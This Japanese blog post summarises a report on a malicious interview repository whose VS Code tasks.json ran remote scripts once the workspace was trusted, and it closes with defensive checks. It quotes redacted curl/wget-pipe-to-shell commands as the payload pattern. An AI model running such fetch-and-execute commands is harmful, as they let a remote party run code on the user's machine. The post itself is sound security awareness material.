---
layout: post
title: "An adversarial coding test - 敵対的なコーディングテスト"
date: 2026-01-22T12:54:14.076Z
categories: [tech, world-news]
tags: [tech-news, japan]
source_url: "https://runjak.codes/posts/2026-01-21-adversarial-coding-test/"
source_title: "runjak.codes: An adversarial coding test"
source_id: 1384634710
excerpt: "面接用リポジトリの.vscode/tasks.jsonが信頼で外部スクリプト実行の罠、開く前に確認を"
image: "https://runjak.codes/profile.png"
---

# An adversarial coding test - 敵対的なコーディングテスト
VS Codeの「このフォルダーを信頼しますか？」で勝手にシェルが走る――面接用リポジトリに仕込まれた巧妙な罠

## 要約
海外の記事は、面接用に渡されたリポジトリの .vscode/tasks.json が「信頼」操作で自動実行され、curl|sh で遠隔スクリプトを落として実行するチェーンが仕込まれていた事例を報告し、発見→通報までの調査をまとめています。

## この記事を読むべき理由
VS Code は日本でも広く使われ、採用面接でリポジトリを受け取る機会も多いです。誤って「信頼」するとローカルで任意コードが走るリスクがあるため、初級者にも知っておいてほしい実用的な危険事例です。

## 詳細解説
- 問題の本質: VS Code のワークスペース「信頼」機能は .vscode/tasks.json に記載されたタスクを自動実行する挙動を持ち、悪意あるタスクで外部コマンド（curl/wget → sh や Windows の cmd）が実行されうる。  
- 発見の流れ: 調査者はまず `git log -- .vscode/tasks.json` で過去コミットを確認。差分やコミットメッセージが不自然で、ファイル内に空白でラップしたりして見辛くする工夫があった。  
- 実際のペイロード: タスクはプラットフォームごとに外部URLからスクリプトを落として即実行する命令を含む（例を下記）。落としたスクリプトは $HOME/Documents にファイルを置き、chmod→nohup でバックグラウンド実行し、さらに短時間有効な JWT を使って次段スクリプトを取得・実行するチェーンだった。  
- 対応: 調査者は GitHub とホスティング（Vercel）に報告し、GitHub 側で対処が行われた。

例（元に近い形式、要注意パターン）:
```bash
curl 'https://.../task/mac?token=XXXXX' | sh
wget -qO- 'https://.../task/linux?token=XXXXX' | sh
curl 'https://.../task/windows?token=XXXXX' | cmd
```

## 実践ポイント
- 「信頼」ボタンは慎重に：見知らぬリポジトリや面接用のものは原則クリックしない。  
- .vscode/* と tasks.json を必ず開いて中身を確認する（curl|wget、chmod、nohup、exec などをチェック）。  
- git 履歴を確認して差し替えや不可解なコミットがないか見る（例: git log -- .vscode/tasks.json）。  
- サンドボックスで開く：Codespaces、コンテナ、VM、ランチャーを使って安全な隔離環境で実行する。  
- 組織として：採用フローで課題リポジトリを渡す場合は事前に検証済みのワークフローか、オンラインIDE（安全な実行環境）を指定する。  
- 不審点は通報：GitHub・ホスティングプロバイダに速やかに報告する。

安全意識と簡単な確認手順だけで被害を避けられる確率は大きく上がります。面接リポジトリを受け取ったらまず一呼吸、ファイル中身の確認を。
